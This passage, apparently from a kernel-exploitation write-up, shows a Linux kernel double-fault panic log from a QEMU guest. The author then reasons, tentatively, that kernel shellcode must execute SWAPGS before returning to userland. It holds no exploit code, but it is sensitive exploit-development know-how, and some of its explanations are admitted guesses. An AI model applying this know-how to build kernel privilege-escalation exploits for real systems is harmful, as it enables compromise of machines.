[    5.640264]  <ENTRY_TRAMPOLINE>
[    5.640511]  ? native_iret+0x7/0x7
[    5.640595]  ? __do_page_fault+0x10/0x4a0
[    5.640685]  ? page_fault+0x1e/0x30
[    5.640780]  ? page_fault+0x8/0x30
[    5.640865]  ? sync_regs+0x3/0x30
[    5.640933]  ? error_entry+0x6f/0xf0
[    5.641144]  </ENTRY_TRAMPOLINE>
[    5.641274] Kernel panic - not syncing: Machine halted.
[    5.641462] CPU: 0 PID: 1036 Comm: runme Tainted: P           O      4.19.76 #1
[    5.641640] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[    5.641892] Call Trace:
[    5.642058]  <#DF>
[    5.642122]  dump_stack+0x46/0x5b
[    5.642258]  panic+0xca/0x218
[    5.642326]  df_debug+0x24/0x30
[    5.642444]  do_double_fault+0x95/0x120
[    5.642571]  double_fault+0x1e/0x30
[    5.642705] RIP: 0010:error_entry+0x22/0xf0
[    5.642822] Code: f9 ff ff 0f 1f 44 00 00 fc 56 48 8b 74 24 08 48 89 7c 24 08 52 31 d2 51 31 c9 50 41 50 45 31 c0 41 51 45 31 c9 41 52 45 31 d2 <41> 53 45 31 db 53 31 db 55 31 ed 41 54 45 31 e4 41 55 45 31 ed 41
[    5.643307] RSP: 0000:fffffe0000002000 EFLAGS: 00000046
[    5.643434] RAX: 0000000081a00ad7 RBX: 0000000000000000 RCX: 0000000000000000
[    5.643582] RDX: 0000000000000000 RSI: ffffffff81a00f58 RDI: fffffe00000020a8
[    5.643745] RBP: 000000000000500c R08: 0000000000000000 R09: 0000000000000000
[    5.643908] R10: 0000000000000000 R11: 0000000000000000 R12: fffffe00000020a8
[    5.644104] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
[    5.644266]  ? page_fault+0x8/0x30
[    5.644361]  </#DF>
[    5.644412]  <ENTRY_TRAMPOLINE>
[    5.644526]  ? native_iret+0x7/0x7
[    5.644643]  ? __do_page_fault+0x10/0x4a0
[    5.644816]  ? page_fault+0x1e/0x30
[    5.644882]  ? page_fault+0x8/0x30
[    5.644977]  ? sync_regs+0x3/0x30
[    5.645042]  ? error_entry+0x6f/0xf0
[    5.645118]  </ENTRY_TRAMPOLINE>
[    5.645563] Kernel Offset: disabled
[    5.645784] Rebooting in 1 seconds..
qemu-system-x86_64: Trying to execute code outside RAM or ROM at 0x000000008197c710
This usually means one of the following happened:

(1) You told QEMU to execute a kernel for the wrong machine type, and it crashed on startup (eg trying to run a raspberry pi kernel on a versatilepb QEMU machine)
(2) You didn't give QEMU a kernel or BIOS filename at all, and QEMU executed a ROM full of no-op instructions until it fell off the end
(3) Your guest kernel has a bug and crashed by jumping off into nowhere

This is almost always one of the first two, so check your command line and that you are using the right type of kernel for this machine.
If you think option (3) is likely then you can try debugging your guest with the -d debug options; in particular -d guest_errors will cause the log to include a dump of the guest register state at this point.

Execution cannot continue; stopping here.
```

What should happen is, when another system call is invoked after returning to userland, SWAPGS is executed once more and kernel code will run with userland GS register. That is what fucks up everything, I guess. Looking at the backtrace, it seems that a page fault ocurred within an IRET instruction, which is uncatchable. And the GS register looks like a kernel address. Before IRET, there must've been a subsequent SWAPGS execution, which caused the GS to become a kernelspace GS and that caused the problem. I am not sure about this though, but from this experiment it became pretty sure that SWAPGS is necessary.

If we omit mapping the stack or code, it causes a segmentation fault at that address, which is less of a nightmare. But debugging these kinds of hardware instructions can be harder than debugging userspace code, so I recommend that when writing kernel shellcode, you should copy-and-paste what others did instead of struggling with it, because it is a waste of time and knowing what to do can save a lot of time and effort.